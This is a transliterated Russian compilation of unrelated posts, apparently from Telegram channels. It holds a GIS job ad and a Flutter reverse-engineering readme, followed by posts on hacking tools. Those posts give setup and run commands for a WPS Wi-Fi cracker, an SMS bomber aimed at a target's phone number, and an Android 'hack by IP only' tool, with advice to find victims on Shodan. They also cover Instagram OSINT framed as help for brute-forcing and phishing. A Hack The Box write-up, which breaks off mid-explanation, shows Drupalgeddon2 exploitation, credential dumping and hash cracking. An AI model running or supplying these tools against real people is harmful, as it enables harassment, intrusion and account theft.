reproetsirovanie dannykh v nuzhnuiu SK; Rabota s rastrami - priviazka, izvlechenie kanalov, katalogizatsiia; Analiticheskoe myshlenie i umenie pererabatyvat' bol'shoi ob'em informatsii; Sposobnost' samostoiatel'no opredeliat' i sobliudat' ustanovlennye sroki zadach; Znanie python3 i umenie pisat' skripty (budet bol'shim pliusom).    Chto my predlagaem:  Mestoraspolozhenie ofisa: m. Lesnaia/pl. Muzhestva, 15 minut na transporte, ul. Kliuchevaia Grafik raboty: PN-PT, 10:00-19:00 Oformlenie s pervogo rabochego dnia po TK RF Belaia zarabotnaia plata, uroven' gotovy obsuzhdat' Rabota v stremitel'no razvivaiushcheisia kompanii s ambitsioznymi planami i ochen' interesnymi proektami; Molodoi i druzhnyi kollektiv;       Sviazat'sia mozhno po ssylke: https://rabota-v-spb.ru/sankt_peterburg/specialist_gis-adv4074166.html  #rabota_SPB #Spetsialist_GIS_Sankt_Peterburg

To flutter: to move in quick, irregular motions, to beat rapidly, to be agitated.Doldrums: a period of stagnation.  Doldrums is a reverse engineering tool for Flutter apps targetting Android. Concretely, it is a parser and information extractor for the Flutter/Dart Android binary, conventionally named libapp.so, for all Dart version 2.10 releases. When run, it outputs a full dump of all classes present in the isolate snapshot.  The tool is currently in beta, and missing some deserialization routines and class information. If it does not work out-of-the-box, please let me know.DependenciesDoldrums requires pyelftools to parse the ELF format. You can install it with  pip3 install pyelftools  UsageTo use, simply run the following command, substituting libapp.so for the appropriate binary, and output for the desired output file. Note that the verbose option only works for Dart snapshot v2.12.  python3 src/main.py [-v] libapp.so output  The expected output is a dump of all classes, in the following format:  class MyApp extends StatelessWidget {Widget build(DynamicType, DynamicType) {Code at absolute offset: 0xec85c}String myPrint(DynamicType, DynamicType) {Code at absolute offset: 0xeca8..

Wifi-Hacking (https://github.com/ankit0183/Wifi-Hacking) - instrument dlia vzloma besprovodnykh podkliuchenii s pomoshch'iu vstroennykh instrumentov. Utilita pozvoliaet nachat' ataku WPS setei, tak zhe preimushchestvom instrumenta iavliaetsia vozmozhnost' nachat' poisk setei WPS, krome togo utilita pozvoliaet pereiti v rezhim monitora.   Ustanovka:  $ apt-get update && apt-get install git  $ git clone https://github.com/ankit0183/Wifi-Hacking  $ cd Wifi-Hacking/    Ispol'zovanie:  $ python3 Wifi-Hacking.py    Podrobnee pro utilitu mozhete prochitat' na ofitsial'noi stranitse Github repozitoriia (https://github.com/ankit0183/Wifi-Hacking).

?Poisk po nomerku:  wget -O geckodriver-linux64.tar.gz echo "https://github.com/`curl -s https://github.com/mozilla/geckodriver/releases | grep -E -o '/mozilla/geckodriver/releases/download/[a-z0-9/.-]{5,}linux64.tar.gz' | head -n 1`"  tar xvzf geckodriver-linux64.tar.gz  sudo mv geckodriver /bin  Zatem skachaite iskhodnyi kod i ustanovite zavisimosti PhoneInfoga:  git clone https://github.com/sundowndev/PhoneInfoga  cd PhoneInfoga/  python3 -m pip install -r requirements.txt --user  cp config.example.py config.py  python3 phoneinfoga.py -v

?Sozdaem bot dlia akkaunta:  Ustanovim zavisimosti. apt update;  apt install python nano git;  pip3 install pyrogram Skopiruem repozitorii. git clone https://github.com/DarkGa/LiteBot Pereidem v repozitorii i nastroim skript. cd LiteBot python3 helper.py Vas poprosit vvesti nomer i odnorazovyi kod (eto normal'no) poluchaem tut https://my.telegram.org/auth?to=apps Perekhodim k ispol'zovaniiu. Napishem legkii skript dlia primera. py3 print('Privet mir') Otpravliaem i smotrim rezul'tat. Tak zhe mozhno i s bash kodom. bash echo 'Privet mir' Tak zhe v bote est' bind koda. Davaite napishem i zapustim legkii skript kotoryi podbrosit monetku. Vse rabotaet  Teper' davaite sdelaem bind na komandu mon. Dlia etogo nuzhno otvet' na soobshchenie kotoryi soderzhit skript. bind mon Kak vidim vse proshlo otlichno, otpravliaem mon i smotrim na rezul'tat. Kak vidim vse rabotaet! Davaite podelimsia etim bindom s drugimi liud'mi. share mon mon eto nazvanie nashego binda Teper' liuboi smozhet ustanovit' sebe etot bind komandoi export. Nuzhno otvetit' na soobshchenie s etoi komandoi. Probuem. Tak kak u nas uzhe est' etot bind nam ne pozvolilo ego importirovat'. Konets!

?Sms spamer?  apt update && apt upgrade pkg install git git clone https://github.com/iMro0t/bomb3r.git cd bomb3r pip3 install -r requirements.txt python3 bomber.py --country 7 [target](to bish' nomer telefona nachinaia s 9) P.S. Posle kliucha strany (--country) mozhno vvesti kliuch --sms i postavit' kol-vo smsok, kotorye vy khotite otpravit'(naprimer python3 bomber.py --country 7 --sms 200 9258127593). No chtoby otpravit' ochen' mnogo sms nuzhen proxy(oni est' i besplatnye). P.S.S. Druz'ia, my nachinaem novyi koding-marafon sredi podpischikov.    Marafon budet sostoiat' iz 10 zadach.    Prizy:  1 mesto: 3000 rub  2 mesto: 1500 rub  3 mesto: 1000 rub    Kazhduiu nedeliu my budem publikovat' 1 zadachu po pitonu, reguliarkam, algoritmam i drugim temam. Za pravil'noe reshenie zadachi vy poluchaete 10 ballov.    My tak zhe sponsiruem privedenie novykh uchastnikov v nash telegram-kanal Pythonboost (https://t.me/pythonboost). Za kazhdogo novogo uchastnika, prishedshego po vashemu priglasheniiu, my dobavliaem vam 2 balla. V teorii mozhno vyigrat' konkurs, ne reshiv ni odnoi zadachi (no eto budet pechal'no).    Dlia podtverzhdeniia togo, chto imenno vy priveli cheloveka - prosto pishite ego nik ili telefon administratoru konkursa - https://t.me/lex_draven    Trebovaniia konkursa:   1. Reshenie oformliat' tut https://repl.it/languages/python3   2. Funktsiia dolzhna vozvrashchat' rezul'tat, a ne pechatat' ego   3. Vse primery iz zadachi (esli oni est') dolzhny rabotat' s vashim kodom   4. Ne pishite nichego lishnego v soobshcheniiakh, prosto ssylka i nomer zadachi.    P.S. Zadachi budut proveriat'sia 1 raz v nedeliu, tak chto ne rasstraivaites', esli srazu net bystrogo otveta.  Vsem udachi.   #zadacha@pythonboost #marafon@pythonboost #python

Vzlamyvaem Android imeia tol'ko IP -adres. 29 iiulia 2021 ot DirolHack Vsem privet na sviazi Dirol! Segodnia ia nauchu vas vzlamyvat' android ustroistva znaia tol'ko ego IP-Andres, v etom nam pomozhet utilita Satana-Android-Debug-Bridge,  nu ne budu vas tomit' pristupaem k ustanovke. <<======================>>                USTANOVKA; <<======================>>  $ apt install android-tools-adb adb git python3 $ apt install android-tools-adb android-tools-fastboot $ git clone https://github.com/Bafomet666/Satana-Android-Debug-Bridge.git $ cd Satana-Android-Debug-Bridge $ python3 SatanaADB.py <<======================>>  Posle otkroetsia meniu, vvodim 3. Teper' neobkhodimo uznat' IP adres, mozhete kak-to dobyt', a mozhete prosto naiti v SHODAN.

OSINT dlia Instagram    Instagram iz-za svoei kontseptsii ne mozhet predlozhit' osobo mnogo informatsii ob opredelennom pol'zovatele. Krome fotografii i statusa vytianut' chto-to bol'shee, na pervyi vzgliad, vriad li poluchitsia. Tem ne menee nekotorye pol'zovateli mogut ostavliat' na stranitsakh ili v postakh email adresa ili nomera telefonov.    OSINT instrument pod Instagram takzhe mozhet ponadobit'sia, chtoby vytianut' id pol'zovatelia dlia posleduiushchego brutforsa, k primeru, ili poluchit' priamye ssylki na fotografii dlia sozdaniia fishinga. Funktsional OSI.IG vpolne mozhet podoiti pod eti zadachi.    Ustanovka    Skachivaem repozitorii s github     clone https://github.com/th3unkn0n/osi.ig.git    Ustanavlivaem zavisimosti     -m pip install -r requirements.txt    Ispol'zovanie    Chtoby zapustit' skanirovanie profilia, neobkhodimo vvesti     main.py -u <nikneim>    Dlia zapuska skanirovaniia postov vvodim    python3 main.py -u <nikneim> -p

Hack The Box. warning Pod kliu chat' sia k mashinam s HTB rekomen duet sia tol' ko cherez VPN. Ne delai eto go s komp' iute rov, gde est' vazh nye dlia tebia dan nye, tak kak ty oka zhesh' sia v obshchei seti s dru gimi uchas tni kami. Razvedka Ad res mashiny -- 10.10.10.233, ne zabyva em dobavit' ego v /etc/hosts i pris voim imia armageddon.htb. I sra zu zhe ska niru em por ty. Pri vozhu svoi tra ditsi onnyi skript, osno van nyi na Nmap: ports = $(nmap -p- --min-rate =500 $1 | grep ^[ 0- 9] | cut -d '/ ' -f 1 | tr ' n' ', ' | sed s/,$//)nmap -p $ports -A $1 Re zul' tat raboty skrip taPo rezul' tatam ska niro vaniia ime em dva otkry tykh por ta: 22 (sluzh ba SSH) i 80 (veb-ser ver Apache). Nash li veb-ser ver -- sra zu zhe idem smot ret', chto za sait na nem raz vernut. Star tovaia stra nitsa sai taNas vstre chaet Drupal -- odna iz populiar nei shikh sis tem upravle niia kon tentom (CMS). V nei naver niaka nai dut sia izves tnye uiaz vimos ti. Tochka vkhoda: Drupal Dlia Drupal tak zhe est' spe tsial' noe sreds tvo ska niro vaniia, kotoroe pomozhet nai ti uiaz vimos ti, -- droopescan. Usta novim prog rammu i vypol nim ska niro vanie v 32 potoka. git clone https:/ / github. com/ droope/ droopescan. git cd droopescan pip install -r requirements. txt python3 droopescan scan drupal -u http:/ / armageddon. htb -t 32 Re zul' tat raboty skrip taDroopescan nashel usta nov lennye pla giny, temy i vero iatnuiu ver siiu CMS. Per vym delom sto it pro verit', est' li dlia obna ruzhen noi ver sii gotovye eks plo ity. Nadezh nee vse go iskat' pri pomoshchi Google, a tak zhe na spe tsiali ziro van nykh sai takh -- HackerOne, Exploit-DB i GitHub. Po isk eks plo itov v GoogleNo esli ty pol' zuesh' sia Kali, to Exploit-DB u tebia uzhe est' i v dan nom slu chae dos tatoch no zapus tit' uti litu searchsploit, chto by nai ti sra zu nes kol' ko eks plo itov. searchsploit Drupal Eks plo ity, nai den nye searchsploitVi dim, chto khost soder zhit izves tnuiu uiaz vimost' Drupalgeddon 2, chto dast nam uda len noe vypol nenie koda (RCE). Pomet ka Metasploit ozna chaet, chto eks plo it uzhe reali zovan dlia Metasploit Framework, i, tak kak eto udob nee, budem ispol' zovat' ego. info Pod robnyi ana liz prin tsipov raboty uiaz vimos ti chitai v stat'e <<Dru pal geddon-2. Pod robno raz bira em novuiu uiaz vimost' v Drupal>>. Tochka opory Kog da neob khodimyi modul' nai den, sto it glia nut', kakie emu nuzh no zadavat' paramet ry (koman da show options). Po isk eks plo ita Drupalgeddon2 v Metasploit Framework Op tsii modulia drupal_drupalgeddon2Ta kim obra zom, sle duet uka zat' tselevoi khost dlia ata ki, a tak zhe adres lokal' nogo khos ta i port dlia obratno go pod kliu cheniia. use exploit / unix / webapp / drupal_drupalgeddon2 set RHOSTS armageddon . htb set LHOST 10 . 10 . 14 . 86 set LPORT 80 run Vy pol nenie eks plo ita Drupalgeddon2I my polucha em obo loch ku, gde mozhem vypol niat' koman dy na uda len nom khos te. Prav da, poka tol' ko v kon tek ste uchet noi zapisi pol' zovate lia-sluzh by. Prodvizhenie Tak kak na khos te raz vernut veb-ser ver, a na nem rabota et dazhe tselaia CMS, to per voe nashe dei stvie -- pop robovat' poluchit' kakie-nibud' uchet nye dan nye pol' zovate lei. Vysoka vero iatnost', chto eti uchet ki podoi dut i dlia lokal' nykh pol' zovate lei v sis teme. V slu chae s Drupal est' mes to, gde uchet nye dan nye est' vseg da, -- fail s nas troi kami dlia pod kliu cheniia k baze dan nykh default/settings.php. So der zhimoe direk torii default So der zhimoe fai la settings.phpEti uchet nye dan nye poz volia iut pod kliu chit' sia k baze dan nykh i poluchit' dru gie kri tiches kie dan nye pol' zovate lei. Sper va koman doi shell poluchim koman dnuiu obo loch ku na uda len noi mashine, pos le chego vypol nim pod kliu chenie k baze dan nykh MySQL s poluchen nymi uchet nymi dan nymi. mysql -u drupaluser -h localhost -p V slu chae s Drupal nas inte resu iut dan nye iz tab litsy users bazy drupal. use drupal ; select name , pass from users ; show ; Dan nye iz tab litsy users bazy drupalNa khodim khesh parolia pol' zovate lia brucetherealadmin. A kak my uzna em iz fai la /etc/passwd, dan nyi pol' zovatel' iavlia etsia sis temnym. So der zhimoe fai la /etc/passwdDa vai perebe rem etot parol' s pomoshch'iu hashcat. Sna chala uzna em, kakoi rezhim ispol' zovat', a potom pereda dim ego nomer cherez parametr -m. hashcat -m 7900 -a 0 hash. txt .. / tools/ rockyou. txt Op redele nie tipa khesha Re zul' tat perebo ra kheshaMy uspeshno perebi raem poluchen nyi khesh i uzna em parol' pol' zovate lia. I pos le pod kliu cheniia po SSH zabira em per vyi flag. Flag pol' zovate lia Lokal'noe povyshenie privilegii Te per', kog da my poluchi li dos tup k khos tu, nam neob khodimo sob rat' informa tsiiu. Istochni kov informa tsii ochen' mno go, i, chto by ne perebi rat' ikh vruch nuiu, ia obych no ispol' zuiu skrip ty PEASS. Oni avto mati ches ki pro khodiat sis temu v pois kakh zatsepok dlia povyshe niia pri vile gii. Zag ruzim na lokal' nyi khost skript dlia Linux. wget https:/ / github. com/ carlospolop/ privilege- escalation- awesome- scripts- suite/ blob/ master/ linPEAS/ linpeas. sh Te per' nuzh no zag ruzit' ego na uda len nyi khost. Dlia eto go mozh no ispol' zovat' stan dar tnye sreds tva SSH. Pos le zag ruzki neob khodimo dat' pra vo na vypol nenie i vypol nit' skript. scp .. / tools/ linpeas. sh brucetherealadmin@armageddon. htb: / tmp/ chmod +x / tmp/ linpeas. sh / tmp/ linpeas. sh Re zul' tat raboty skrip taVi dim, chto my mozhem zatsepit' sia za nas troi ki sudoers (sudo -l). Pol' zovatel' brucetherealadmin bez vvo da parolia mozhet vypol nit' sle duiushchuiu koman du v pri vile giro van nom kon tek ste: / usr/ bin/ snap install * Snap -- eto sis tema upravle niia i ras pre dele niia paketov, soz dannaia v Canonical (raz rabot chik Ubuntu). Sami pakety Snap pred stav liaiut soboi zaranee skom piliro van nye vmes te so vse mi zavisi mos tiami i bib liote kami pri lozhe niia, kotorye zatem ispolnia iutsia v izo liro van noi sre de. Oni leg che i bys tree usta nav liva iutsia, mogut poluchat' pos lednie obnovle niia, a tak zhe bolee bezopas ny s toch ki zre niia dos tupa k ope ratsi onnoi sis teme i vazh nym fai lam. No vse zhe pri lozhe niia mogut poluchat' dos tup k khos tu pri rabote v rezhime devmode. Snap ispol' zuet Linux-soket AF_UNIX, kotoryi neob khodim dlia svia zi mezh du pro tses sami na odnom komp' iute re. Dlia nego usta nov leny pra va 0666, chto poz volia et liubomu pro tses su pod kliu chat' sia i vza imo dei stvo vat' s etim soketom.

#soft@skyforprogamms   Detektim xss na veb saite cherez Termux    Saliut, bandity. XSS (ot angl. Cross-Site Scripting -- <<mezhsaitovyi skripting>>) -- dovol'no rasprostranennaia uiazvimost', kotoruiu mozhno obnaruzhit' na mnozhestve veb-prilozhenii. Ee sut' dovol'no prosta, zloumyshlenniku udaetsia vnedrit' na stranitsu JavaScript-kod, kotoryi ne byl predusmotren razrabotchikami. Etot kod budet vypolniat'sia kazhdyi raz, kogda zhertvy (obychnye pol'zovateli) budut zakhodit' na stranitsu prilozheniia, kuda etot kod byl dobavlen.    Pered vami skript, kotoryi pozvoliaet detektit' etu uiazvimost'.      Ustanovka:   git clone https://github.com/xadhrit/xira.git  cd xira  python3 -m pip install -r requirements.txt    Zapusk:   python xira.py -u <url>    Bezopasnosti post
